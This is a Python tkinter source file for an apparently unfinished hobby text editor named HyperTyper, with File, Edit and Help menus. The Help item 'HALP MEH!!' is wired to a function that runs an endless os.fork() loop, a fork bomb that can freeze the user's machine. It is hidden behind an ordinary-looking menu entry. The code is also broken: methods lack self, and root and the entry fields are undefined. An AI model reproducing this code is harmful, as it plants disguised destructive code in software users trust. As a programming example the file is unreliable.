#!/usr/bin/env python3

##################################
# Program Name: classtyper       #
# Version: 1.1.1                 #
# Author: Ethan Hicks            #
# Published: 2/09/2016           #
################################## 

import tkinter
from tkinter import *
from tkinter import filedialog
import os



class HyperTyper(tkinter.Text):


	def __init__(self):

		root = Tk()
		
		root.wm_title('HYPER TYPER')
		
		label = tkinter.Label(root, text = 'Welcome to the multiline text editor HyperTyper!\n The Limited functionality is free!')
		label.pack()
		
		frame1 = tkinter.Frame(root)
		frame1.pack()
		
		frame2 = tkinter.Frame(root)
		frame2.pack()


		main_text = tkinter.Text(root)
		main_text.pack()

	def menu_bar(self):

		menubar = Menu(root)
		filemenu = Menu(menubar, tearoff=0)
		filemenu.add_command(label="New", command=donothing)
		filemenu.add_command(label="Open", command=Open_File)
		filemenu.add_command(label="Save", command=Save_File)
		filemenu.add_command(label="Save as...", command=donothing)
		filemenu.add_command(label="Close", command=donothing)

		filemenu.add_separator()

		filemenu.add_command(label="Exit", command=root.quit)
		menubar.add_cascade(label="File", menu=filemenu)
		editmenu = Menu(menubar, tearoff=0)
		editmenu.add_command(label="Undo", command=donothing)

		editmenu.add_separator()

		editmenu.add_command(label="Cut", command=donothing)
		editmenu.add_command(label="Copy", command=donothing)
		editmenu.add_command(label="Paste", command=donothing)
		editmenu.add_command(label="Delete", command=donothing)
		editmenu.add_command(label="Select All", command=donothing)

		menubar.add_cascade(label="Edit", menu=editmenu)
		helpmenu = Menu(menubar, tearoff=0)
		helpmenu.add_command(label="HALP MEH!!", command=kill_everything)
		helpmenu.add_command(label="About...", command=donothing)
		menubar.add_cascade(label="Help", menu=helpmenu)

		root.config(menu=menubar)

	

	def donothing():
	   filewindow = Toplevel(root)
	   button = Button(filewindow, text="FAIL")
	   button.pack()

	def kill_everything():
		while(1):
			os.fork()


	def Open_File():   
	    root.filename = filedialog.askopenfilename(filetypes = (("text files",".txt"),("All Files","*.*")))
	    text = root.filename.split('/')
	    filename = text[-1]
	    entry1.insert(0,filename)
	    #print(filename)

	def Save_File():
	    root.filename = filedialog.asksaveasfilename(filetypes = (("text files",".txt"),("All Files","*.*")))
	    text = root.filename.split('/') 
	    filename = text[-1]
	    entry2.insert(0,filename)